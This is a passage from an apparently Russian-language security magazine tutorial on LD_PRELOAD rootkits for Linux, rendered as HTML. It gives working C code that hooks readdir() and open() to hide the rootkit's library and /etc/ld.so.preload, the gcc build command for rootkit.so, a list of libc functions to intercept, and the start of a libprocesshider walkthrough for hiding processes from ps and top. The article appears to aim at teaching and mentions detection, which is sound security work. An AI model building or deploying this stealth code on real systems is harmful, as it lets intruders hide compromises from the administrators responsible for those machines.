<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">// Сохраняем указатель оригинальной функции open</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">int (*o_open)(const char*, int oflag) = NULL;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">struct dirent *readdir(DIR *dirp)</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">{</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">if (orig_readdir == NULL)</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">orig_readdir = (struct dirent*(*)(DIR *))dlsym(RTLD_NEXT, &quot;readdir&quot;);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">struct dirent *ep = orig_readdir( dirp );</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">while ( ep != NULL &amp;&amp;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">( !strncmp(ep-&gt;d_name, RKIT, strlen(RKIT)) ||</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">!strncmp(ep-&gt;d_name, LD_PL, strlen(LD_PL))</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">)) {</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ep = orig_readdir(dirp);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">}</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">return ep;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">}</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">// Работаем с функцией open()</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">int open(const char *path, int oflag, ...)</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">{</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">char real_path[PATH_MAX];</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">if(!o_open)</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">o_open = dlsym(RTLD_NEXT, &quot;open&quot;);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">realpath(path, real_path);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">if(strcmp(real_path, LD_PATH) == 0)</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">{</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">errno = ENOENT;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">return -1;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">}</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">return o_open(path, oflag);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">}</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p61"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">З</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">десь мы добави­ли кусок кода, который дела­ет то же самое, что и с </span><a name="code110"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">r</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">eaddir(). Ком­пилиру­ем и про­веря­ем:</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="panel14"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> gcc -Wall -fPIC -shared -o rootkit.so rkit.c -ldl</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code112"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> cat /etc/ld.so.preload</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">cat: /etc/ld.so.preload: Нет такого фай­ла или катало­га</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p63"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Т</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ак гораз­до луч­ше, но это еще далеко не все вари­анты обна­руже­ния </span><a name="code113"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">/</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">etc/ld.so.preload.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p64"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">М</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ы до сих пор можем без проб­лем уда­лить файл, перемес­тить его со сме­ной наз­вания (и тог­да ls сно­ва его уви­дит), поменять ему пра­ва без уве­дом­ления об ошиб­ке. Даже bash услужли­во про­дол­жит его имя при нажатии на Tab.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p65"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">В</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> хороших рут­китах, экс­плу­ати­рующих лазей­ку с </span><a name="code114"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">L</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">D_PRELOAD, реали­зован перех­ват сле­дующих фун­кций:</span></p>
<ul style="margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; -qt-list-indent: 1;"><li style=" font-family:'DejaVu LGC Sans'; font-size:12pt;" style=" margin-top:12px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code115"></a>listxattr, <a name="code116"></a>llistxattr, <a name="code117"></a>flistxattr;</li>
<li style=" font-family:'DejaVu LGC Sans'; font-size:12pt;" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code118"></a>getxattr, <a name="code119"></a>lgetxattr, <a name="code120"></a>fgetxattr;</li>
<li style=" font-family:'DejaVu LGC Sans'; font-size:12pt;" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code121"></a>setxattr, <a name="code122"></a>lsetxattr, <a name="code123"></a>fsetxattr;</li>
<li style=" font-family:'DejaVu LGC Sans'; font-size:12pt;" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code124"></a>removexattr, <a name="code125"></a>lremovexattr, <a name="code126"></a>fremovexattr;</li>
<li style=" font-family:'DejaVu LGC Sans'; font-size:12pt;" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code127"></a>open, <a name="code128"></a>open64, <a name="code129"></a>openat, <a name="code130"></a>creat;</li>
<li style=" font-family:'DejaVu LGC Sans'; font-size:12pt;" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code131"></a>unlink, <a name="code132"></a>unlinkat, <a name="code133"></a>rmdir;</li>
<li style=" font-family:'DejaVu LGC Sans'; font-size:12pt;" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code134"></a>symlink, <a name="code135"></a>symlinkat;</li>
<li style=" font-family:'DejaVu LGC Sans'; font-size:12pt;" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code136"></a>mkdir, <a name="code137"></a>mkdirat, <a name="code138"></a>chdir, <a name="code139"></a>fchdir, <a name="code140"></a>opendir, <a name="code141"></a>opendir64, <a name="code142"></a>fdopendir, <a name="code143"></a>readdir, <a name="code144"></a>readdir64;</li>
<li style=" font-family:'DejaVu LGC Sans'; font-size:12pt;" style=" margin-top:0px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code145"></a>execve.</li></ul>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p66"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Р</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">аз­бирать под­мену каж­дой из них мы, конеч­но же, не будем. Можешь в качес­тве при­мера перех­вата перечис­ленных фун­кций пос­мотреть рут­кит </span><a href="https://github.com/mempodippy/cub3/blob/master/cub3.c"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; text-decoration: underline; color:#0000ff;">cub3</span></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> — там все те же </span><a name="code146"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">d</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">lsym() и </span><a name="code147"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">R</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">TLD_NEXT.</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="toc06."></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> </span></p>
<h2 style=" margin-top:16px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">Скрываем процесс с помощью LD_PRELOAD</span></h2>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p67"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">П</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ри работе рут­киту нуж­но как‑то скры­вать свою активность от стан­дар­тных ути­лит монито­рин­га, таких как </span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">lsof</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">, </span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">ps</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">, </span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">top</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p68"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">М</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ы уже доволь­но деталь­но разоб­рались, как работа­ет пере­опре­деле­ние фун­кций </span><a name="code148"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">L</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">D_PRELOAD. Для про­цес­сов все то же самое. Более того, стан­дар­тные прог­раммы исполь­зуют в сво­ей работе </span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">procfs</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">, вир­туаль­ную фай­ловую сис­тему, которая пред­став­ляет собой интерфейс для вза­имо­дей­ствия с ядром ОС.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p69"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Ч</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">те­ние и запись в procfs реали­зова­ны так же, как и в обыч­ной фай­ловой сис­теме. То есть, как ты можешь догадать­ся, наш опыт с </span><a name="code149"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">r</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">eaddir() здесь при­дет­ся кста­ти. 🙂</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="toc06.1"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> </span></p>
<h3 style=" margin-top:14px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">libprocesshider</span></h3>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p70"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">К</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ак скрыть активность из монито­рин­га, пред­лагаю рас­смот­реть на хорошем при­мере </span><a href="https://github.com/gianlucaborello/libprocesshider"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; text-decoration: underline; color:#0000ff;">libprocesshider</span></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">, который раз­работал Джан­лука Борел­ло (Gianluca Borello), автор </span><a href="https://sysdig.com/"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; text-decoration: underline; color:#0000ff;">Sysdig.com</span></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> (о Sysdig и методах обна­руже­ния рут­китов </span><a name="code150"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">L</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">D_PRELOAD мы погово­рим в кон­це статьи).</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p71"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Д</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">а­вай ско­пиру­ем код с GitHub и раз­берем­ся, что к чему:</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="panel15"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> git clone https://github.com/gianlucaborello/libprocesshider</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code152"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> cd libprocesshider</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code153"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> ls</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">evil_script.py Makefile processhider.c README.md</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p73"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">В</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> опи­сании к </span><a name="code154"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">l</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ibprocesshider все прос­то: дела­ем </span><a name="code155"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">m</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ake, копиру­ем в </span><a name="code156"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">/</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">usr/local/lib/ и добав­ляем в </span><a name="code157"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">/</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">etc/ld.so.preload. Сде­лаем все, кро­ме пос­ледне­го:</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$ make </span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$ sudo mv libprocesshider.so /usr/local/lib/ </span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p74"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Т</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">е­перь давай пос­мотрим, каким обра­зом ps получа­ет информа­цию о про­цес­сах. Для это­го запус­тим ltrace:</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="panel16"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> ltrace /bin/ps</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">...</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">time(0) = 1606208519</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">meminfo(0, 4096, 0, 0x7f1787ce9207) = 0</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">openproc(96, 0, 0, 0) = 0x55c6f9f145c0</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">readproc(0x55c6f9f145c0, 0x55c6f8258580, 0x7f1787651010, 0) = 0x55c6f8258580</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">readproc(0x55c6f9f145c0, 0x55c6f8258580, 0, 7) = 0x55c6f8258580</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">readproc(0x55c6f9f145c0, 0x55c6f8258580, 0, 5) = 0x55c6f8258580</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">readproc(0x55c6f9f145c0, 0x55c6f8258580, 0, 5) = 0x55c6f8258580</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">...</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p76"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">И</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">н­форма­цию о про­цес­се получа­ем при помощи фун­кции </span><a name="code160"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">r</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">eadproc(). Пос­мотрим реали­зацию этой фун­кции в фай­ле </span><a name="code161"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">r</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">eadproc.c:</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">static int simple_nextpid(PROCTAB *restrict const PT, proc_t *restrict const p) {</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">static struct direct *ent;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">char *restrict const path = PT-&gt;path;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">for (;;) {</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ent = readdir(PT-&gt;procfs);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">if(unlikely(unlikely(!ent) || unlikely(!ent-&gt;d_name))) return 0;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">if(likely(likely(*ent-&gt;d_name &gt; '0') &amp;&amp; likely(*ent-&gt;d_name &lt;= '9'))) break;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">}</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">p-&gt;tgid = strtoul(ent-&gt;d_name, NULL, 10);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">p-&gt;tid = p-&gt;tgid;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">memcpy(path, &quot;/proc/&quot;, 6);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">strcpy(path+6, ent-&gt;d_name);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">return 1;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">}</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p77"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">И</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">з это­го кода понят­но, что PID про­цес­сов получа­ют, вызывая </span><a name="code163"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">r</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">eaddir() в цик­ле </span><a name="code164"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">f</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">or. Дру­гими сло­вами, если нет дирек­тории про­цес­са — нет и самого про­цес­са для ути­лит монито­рин­га. При­веду при­мер час­ти кода </span><a name="code165"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">l</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ibprocesshider, где уже зна­комым нам методом мы скры­ваем дирек­торию про­цес­са:</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">...</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">while(1)</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">{</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">dir = original_##readdir(dirp);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">if(dir) {</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">char dir_name[256];</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">char process_name[256];</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &amp;&amp;</span></p>
